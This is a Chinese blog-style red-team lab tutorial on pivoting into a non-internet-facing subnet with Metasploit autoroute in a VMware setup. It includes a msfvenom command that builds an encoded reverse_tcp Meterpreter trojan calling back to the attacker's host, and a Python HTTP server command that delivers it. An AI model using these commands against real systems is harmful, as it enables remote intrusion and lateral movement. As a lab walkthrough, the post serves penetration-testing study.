---
title: Pivoting跳板攻击与自动路由
tags: 红蓝对抗
categories: 内网渗透
top: 11
---
## 网络拓扑图及通信原理
我们现在假若得到了`192.168.103.101`的主机权限，但是我们经过收集信息发现只有该win7主机是出网的，里面还有一个网段的主机不出网，那么这时我们就要使用跳板攻击的方式访问到不出网的主机。这里我们假设出网的网段为`192.168.103.0/24`，不出网的数据库主机所处网段为`192.168.104.0/24`，我们在vmware上分别设置好这两个网段。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321120638928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
vmnet2之前上一章已经配置完成，vmnet3设置DHCP配置
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321121040583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
<!--more-->
**win7**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321121411556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)

**windows server2003**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321121359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
<!--more-->
## 攻击过程
现在我们在kali上生成一个木马文件，然后使用win7下载到本机上，使用管理员的权限运行该文件。

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.101.63(这是kali的NAT映射到外网的IP) lport=4444 -b "\x00\xff" -a x86 --platform windows -e x86/shikata_ga_nai -f exe > msf.exe
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321121742286.png)
然后在kali上开启一个HTTP服务，使用win7下载到本机上

```bash
python -m SimpleHTTPServer 4444
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321122221783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
kali上使用`windows/meterpreter/reverse_tcp`这个漏洞利用模块，其他操作不再赘述
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321122504738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
进一步提权
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321122804150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
然后我们在meterpreter上使用`ipconfig`这个命令时，发现了两个网段的IP地址，初步判断有可能是内网敏感数据所处的IP网段
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321122928633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/202103211229485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
不说废话，立马开干！首先使用`post/windows/gather/arp_scanner`模块对内网信息进行收集
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321123103614.png)
然后使用自动路由的方式，将`192.168.104.0/24`这个网段添加到路由表中
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321123256486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
然后将会话拉入后台中，接着我们使用`auxiliary/scanner/portscan/tcp`这个模块扫描主机开放了哪些端口和服务。这里我们就选了几个常用的端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321123522805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
收集完成！
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021032112354091.png)

